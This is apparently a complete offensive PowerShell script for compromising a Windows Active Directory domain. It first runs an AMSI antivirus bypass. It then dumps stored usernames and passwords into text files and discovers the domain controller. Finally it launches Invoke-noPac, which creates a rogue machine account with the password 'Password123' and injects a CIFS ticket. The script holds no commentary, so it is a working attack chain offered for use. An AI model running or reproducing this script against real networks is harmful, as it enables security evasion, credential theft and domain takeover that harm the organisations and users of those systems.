.\amsi-opcode.ps1
import-module .\dumpUserStore.ps1
import-module activedirectory
.\dumpUserStore.ps1 > username.txt
import-module .\dumpPassStore.ps1 
.\dumpPassStore.ps1 > password.txt
$DC = Get-ADDomainController -Discover -Site "Default-First-Site-Name" -ForceDiscover | select Name > DC.txt
$DC = Get-Content .\DC.txt | select -Index 3
$DC |Foreach {$_.TrimEnd()} | Set-Content DC.txt
$DC.TrimEnd() > .\DC.txt
$DC = Get-Content .\DC.txt
$username = Get-Content .\username.txt -First 1
$password = Get-Content .\password.txt -First 1
$domain = (gwmi win32_computersystem).Domain
$DCvar = "$DC.$domain"
import-module .\Invoke-noPac.ps1
Invoke-noPac "-domain $domain -user $username -pass $password /enctype rc4 /dc $DCvar /mAccount newmachine /mPassword Password123 /service cifs /ptt"
